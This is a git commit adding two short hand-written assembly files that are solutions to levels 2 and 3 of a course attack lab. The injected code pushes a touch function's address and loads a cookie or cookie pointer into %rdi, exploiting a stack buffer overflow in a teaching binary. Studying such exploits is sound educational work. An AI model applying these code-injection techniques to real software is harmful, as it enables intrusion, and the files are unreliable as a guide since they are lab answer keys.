dd8da83b2a6de0b5d57967faa40ef4a6f51e06d4
Li Yuxing <emanonstar@gmail.com>
2022-06-07 13:39:38 +0800

    complete ctarget

---
+++ attacklab/target1/ct_l2.s
@@ -0,0 +1,5 @@
+# Hand-generated assembly code of exploid code l2
+
+	pushq	$0x4017ec		# Push address of <touch2> onto stack
+	movq	$0x59b997fa, %rdi 	# Copy cookie to %rdi
+	ret				# Return 
---
+++ attacklab/target1/ct_l3.s
@@ -0,0 +1,5 @@
+# Hand-generated assembly code of exploid code l3
+
+	pushq	$0x4018fa			# Push address of <touch3> onto stack
+	movq	$0x5561dca8, %rdi 	# Copy address of injected cookie to %rdi
+	ret							# Return 
